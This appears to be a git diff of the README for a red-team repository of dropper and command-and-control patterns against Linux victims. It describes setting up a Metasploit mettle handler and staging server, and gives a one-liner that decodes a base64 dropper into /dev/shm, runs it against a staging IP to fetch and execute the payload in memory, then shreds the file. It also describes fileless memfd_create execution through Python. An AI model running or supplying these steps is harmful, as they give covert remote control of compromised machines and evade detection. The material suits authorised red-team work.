@@ -2,9 +2,17 @@
 
 ## Purpose
 
-This repository contains the collection of code execution building blocks and patterns useful during red team engagements.
+This repository contains the collection of initial code execution patterns and C2 mechanisms useful during red team engagements.
 
-## Backend (basic version)
+## Scenario 1
+
+**Objectives:** setup an interactive C2 communication channel between victim machine and a red team controlled server. Using sophisticated evasion techniques on both network and host levels are not necessary as target environemnt is not actively monitored so the risks of being exposed are minimal. The priority is on having convenient and interactive C2 communication channel with the victim Linux machine.
+
+**Assumptions:**
+
+ - Red team members have already achieved remote `/bin/sh` access to the victim machine for example via: mounting successful password guessing attack on ssh service, using (previously acquired) credentials (e.g. SSH key), exploiting publicly exposed service (e.g. postfix), exploting vulnerability in hosted web application. 
+
+### Backend
 
 Staging machine (ephemeral) serving stageless `mettle` payload:
 
@@ -28,19 +36,19 @@ EOF
 c2$ msfconsole -r mettle-handler.rc
 ```
 
-## Pattern 0
+### Pattern 0
+
+Preparation:
 
 ```
+# Getting source file:
 wget https://raw.githubusercontent.com/mzet-/z-dropper/main/z-dropper-case0.zig
 ```
 
-## Pattern 1
+### Pattern 1
 
-Assumptions:
-
- - Red Team member has already achieved remote `/bin/sh` access to the victim machine.
  - Only `z-dropper` is dropped on the victim's filesystem (though only on `tmpfs`).
- - Main payload (stageless `mettle` binary in this case) is downloaded and executed using `memfd_create` syscall (directly from memory).
+ - Main payload (stageless `mettle` binary in this case) is downloaded and executed using `memfd_create` + `execve` syscalls (directly from memory).
 
 Preparing C version:
 
@@ -68,11 +76,10 @@ EXE=z-dropper-case1; zig build-exe -OReleaseSmall --strip ${EXE}.zig; echo; cat 
 echo -n '<BASE64_ENCODED_BIN>' | base64 -d >/dev/shm/s; chmod +x /dev/shm/s; /dev/shm/s <STAGING_IP> 443; shred -u -f -z /dev/shm/s
 ```
 
-## Pattern 2
+### Pattern 2
 
 Assumptions:
 
- - Red Team member has already achieved remote `/bin/sh` access to the victim machine.
  - Pure fileless execution (with the help of Python interpreter)
  - Python 3 interpreter is required on the victim machine. 
- - Payload (stageless `mettle` binary in this case) is downloaded and executed using `memfd_create` syscall using Python's `ctype` module.
+ - Payload (stageless `mettle` binary in this case) is downloaded and executed using `memfd_create` + `execve` syscalls using Python's `ctype` module.
